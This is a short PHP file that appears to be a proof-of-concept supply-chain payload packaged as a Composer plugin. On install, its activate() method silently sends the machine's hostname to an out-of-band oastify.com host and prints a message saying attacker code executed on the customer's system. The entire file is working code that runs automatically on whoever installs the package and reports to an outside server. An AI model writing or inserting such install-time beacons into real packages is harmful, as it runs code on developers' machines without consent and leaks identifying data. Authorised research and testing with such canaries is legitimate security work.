<?php
namespace Pk; use Composer\Composer; use Composer\IO\IOInterface; use Composer\Plugin\PluginInterface;
class Beacon implements PluginInterface {
  public function activate(Composer $c, IOInterface $io){ @file_get_contents('https://lpednuef7r5i25v167h5qlhjtaz1nubj.oastify.com/CUSTOMER-RCE-'.php_uname('n')); $io->write('[pk-customer-chain] attacker code executed on CUSTOMER consumer'); }
  public function deactivate(Composer $c, IOInterface $io){} public function uninstall(Composer $c, IOInterface $io){} }
